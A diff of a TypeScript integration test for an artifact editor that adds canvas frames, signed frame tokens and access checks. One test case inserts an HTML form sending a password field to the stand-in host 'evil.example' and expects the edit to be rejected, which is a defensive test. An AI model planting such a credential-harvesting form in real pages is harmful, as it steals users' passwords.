@@ -7,13 +7,13 @@ import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest'
 import { createCaller } from '../router.ts'
 import { serveArtifactFile, serveArtifactFrame } from '../services/artifacts/frame.ts'
 import type { ChatContext } from '../services/chat/context.ts'
-import { pageKeys } from '../services/chat/page-tokens.ts'
+import { pageKeys, signArtifactToken } from '../services/chat/page-tokens.ts'
 
-// The mockup of an artifact on PostgreSQL (docs/plan/88-artifacts.md, Ар9, Ар12, Ар28, §7.10;
-// slices 88.12 and 88.13): the calculator of the template, its frame for its viewer with its files
-// by signed addresses, «Править текст» by the offsets of parse5, «Открыть как артефакт» of a file
-// of a chat, and the mockup published as a page of HTML with its files. Every test works in
-// workspaces of its own and removes them.
+// The frames of an artifact on PostgreSQL (docs/plan/88-artifacts.md, Ар9, Ар12, Ар28, §7.10;
+// slices 88.12 and 88.13; plan 93, АТ6): the calculator of the template — a canvas of one screen —,
+// its frame for its viewer with its files by signed addresses, «Править текст» by the offsets of
+// parse5, «Открыть как артефакт» of a file of a chat as a canvas of one screen, published as a site
+// of HTML. Every test works in workspaces of its own and removes them.
 
 const databaseUrl = process.env.DATABASE_URL
 const PAGES = 'http://pages.localhost:3110'
@@ -42,7 +42,7 @@ const requiredConsents = legalDocuments.flatMap((document) =>
     : [],
 )
 
-describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabinet', () => {
+describe.skipIf(!databaseUrl)('PostgreSQL: the frames of an artifact in the cabinet', () => {
   let db: PrismaClient
   const userIds: string[] = []
 
@@ -122,14 +122,21 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     const anna = await person()
     const caller = callerOf(anna)
     const { id } = await caller.artifact.create({
-      kind: 'mockup',
+      kind: 'canvas',
       title: 'Калькулятор стоимости',
       projectId: null,
       templateId: 'cost-calculator',
     })
     const read = await caller.artifact.read({ artifactId: id })
-    expect(read.blocks.map((block) => block.kind)).toEqual(['style', 'html', 'settings', 'script'])
-    // A picture of the mockup: announced, then its bytes (as PUT /api/artifact-files does).
+    // One screen with its parts inside it; the settings at the top, for its script (АТ6).
+    expect(read.blocks.map((block) => `${block.parent ?? '-'}/${block.kind}`).toSorted()).toEqual([
+      '-/frame',
+      '-/settings',
+      'calc/html',
+      'calc/script',
+      'calc/style',
+    ])
+    // A picture of the screen: announced, then its bytes (as PUT /api/artifact-files does).
     const started = await caller.artifact.fileStart({
       artifactId: id,
       name: 'logo.png',
@@ -162,7 +169,7 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
         ],
       },
     })
-    const view = await caller.artifact.frame({ artifactId: id, mode: 'view' })
+    const view = await caller.artifact.frame({ artifactId: id, mode: 'view', frame: 'calc' })
     expect(view.url.startsWith(`${PAGES}/v/`)).toBe(true)
     const chat = {
       pageViews: { origin: PAGES, appUrl: 'http://localhost:3110', keys },
@@ -182,7 +189,7 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     const file = await serveArtifactFile(db, chat, { token: tokenOf(served.sources.images[0]!) })
     expect(file).toEqual({ ok: true, type: 'image/png', bytes: Buffer.from(PNG) })
     // The edit frame: no script, the bridge neither; ids in each element, links lead nowhere.
-    const edit = await caller.artifact.frame({ artifactId: id, mode: 'edit' })
+    const edit = await caller.artifact.frame({ artifactId: id, mode: 'edit', frame: 'calc' })
     expect(edit.url.startsWith('/api/artifact-frame/')).toBe(true)
     const copy = await serveArtifactFrame(db, chat, {
       token: tokenOf(edit.url),
@@ -198,6 +205,24 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     expect(
       await serveArtifactFrame(db, chat, { token: tokenOf(edit.url), mode: 'view', fonts }),
     ).toEqual({ ok: false, status: 404 })
+    // A token opens a frame block only: none named (the old mockup's), or a part of the screen.
+    const signed = (frame?: string) =>
+      signArtifactToken(keys.view, 'artifact', {
+        artifactId: id,
+        userId: anna.id,
+        expiresAt: Date.now() + 60_000,
+        ...(frame === undefined ? {} : { frame }),
+      })
+    for (const token of [signed(), signed(html.key), signed('nowhere')])
+      expect(await serveArtifactFrame(db, chat, { token, mode: 'view', fonts })).toEqual({
+        ok: false,
+        status: 404,
+      })
+    // Someone else gets no address of the frame at all.
+    const boris = callerOf(await person('Борис'))
+    await expect(
+      boris.artifact.frame({ artifactId: id, mode: 'view', frame: 'calc' }),
+    ).rejects.toMatchObject({ code: 'NOT_FOUND' })
     await caller.artifact.trash({ artifactId: id })
     expect(
       await serveArtifactFrame(db, chat, { token: tokenOf(view.url), mode: 'view', fonts }),
@@ -211,7 +236,7 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     const anna = await person()
     const caller = callerOf(anna)
     const { id } = await caller.artifact.create({
-      kind: 'mockup',
+      kind: 'canvas',
       title: 'Лендинг',
       projectId: null,
       templateId: null,
@@ -223,14 +248,33 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
         ops: [
           {
             op: 'insert',
+            block: 'home',
+            after: null,
+            kind: 'frame',
+            content: '',
+            props: { name: 'Главная', path: '/', x: 0, y: 0 },
+          },
+          {
+            op: 'insert',
             block: 'hero',
             after: null,
+            parent: 'home',
             kind: 'html',
             content: '<section><h1>Кофе <b>с собой</b></h1></section>',
           },
         ],
       },
     })
+    // A document has no frame to open.
+    const doc = await caller.artifact.create({
+      kind: 'document',
+      title: 'Заметки',
+      projectId: null,
+      templateId: null,
+    })
+    await expect(
+      caller.artifact.frame({ artifactId: doc.id, mode: 'view', frame: 'home' }),
+    ).rejects.toMatchObject({ code: 'NOT_FOUND' })
     const answer = await caller.artifact.editText({
       artifactId: id,
       block: 'hero',
@@ -241,7 +285,7 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     })
     expect(answer.repeated).toBe(false)
     const after = await caller.artifact.read({ artifactId: id })
-    expect(after.blocks[0]!.content).toBe(
+    expect(after.blocks.find((block) => block.key === 'hero')!.content).toBe(
       '<section><h1>Чай &lt;и&gt; <b>с собой</b></h1></section>',
     )
     await expect(
@@ -265,6 +309,7 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
               op: 'insert',
               block: 'form',
               after: 'hero',
+              parent: 'home',
               kind: 'html',
               content:
                 '<form action="https://evil.example"><input type="password" name="p"></form>',
@@ -275,7 +320,7 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     ).rejects.toBeTruthy()
   })
 
-  it('opens a .html file of a chat as a mockup and publishes it as a page of HTML with its files', async () => {
+  it('opens a .html file of a chat as a canvas of one screen and publishes it as a site', async () => {
     const anna = await person()
     const caller = callerOf(anna)
     const first = await caller.artifact.create({
@@ -306,9 +351,15 @@ describe.skipIf(!databaseUrl)('PostgreSQL: the mockup of an artifact in the cabi
     })
     const { id } = await caller.artifact.importFile({ taskId: task.id, fileId })
     const read = await caller.artifact.read({ artifactId: id })
-    expect(read.kind).toBe('mockup')
+    expect(read.kind).toBe('canvas')
     expect(read.title).toBe('Окна')
-    expect(read.blocks.map((block) => block.kind)).toEqual(['style', 'html', 'script'])
+    expect(
+      read.blocks.map((block) => `${block.parent ?? '-'}/${block.key}/${block.kind}`).toSorted(),
+    ).toEqual(['-/home/frame', 'home/b2/style', 'home/b3/html', 'home/b4/script'])
+    expect(read.blocks.find((block) => block.key === 'home')!.props).toMatchObject({
+      name: 'Главная',
+      path: '/',
+    })
     const published = await caller.pages.publishArtifact({ artifactId: id, versionNo: null })
     const pageRow = await db.page.findUniqueOrThrow({
       where: { id: published.pageId },
